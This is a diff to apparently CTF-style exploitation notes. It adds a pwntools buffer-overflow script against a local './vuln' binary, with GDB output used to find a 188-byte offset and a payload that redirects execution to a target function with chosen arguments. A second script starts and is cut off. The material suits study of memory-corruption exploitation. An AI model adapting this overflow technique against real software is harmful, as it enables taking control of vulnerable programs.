@@ -70,6 +70,48 @@ RIP: Instruction Pointer, next instruction to be executed.
 ```python
 from pwn import *
 
+# GDB
+# searchmem 0x41414141
+# searchmem 0x08049318
+
+# gdb-peda$ searchmem 0x41414141
+# [stack] : 0xffffcc50 ("AAAA")
+
+# gdb-peda$ searchmem 0x08049318
+# [stack] : 0xffffcd0c --> 0x8049318 (<main+103>:	mov    eax,0x0)
+
+# print/d 0xffffcd0c - 0xffffcc50
+# $1 = 188
+
+p = process('./vuln')
+# p = remote('x.x.x.x', 30897)
+offset = 188
+
+next_address = p32(0x080491e2)
+payload = b'A' * offset 
+payload += next_address
+
+# because i don't return from target function
+payload += p32(0x00000000) 
+
+# arguments to the target function
+payload += p32(0xdeadbeef) 
+payload += p32(0xc0ded00d)
+
+p.recvline()
+p.sendline(payload)
+
+try:
+    for i in range(5):
+        x = p.recv(1024)
+        print(x)
+except:
+    print("Done.")
+```
+
+```python
+from pwn import *
+
 def main():
     context.log_level = 'DEBUG'
     context(os='linux', arch='amd64')
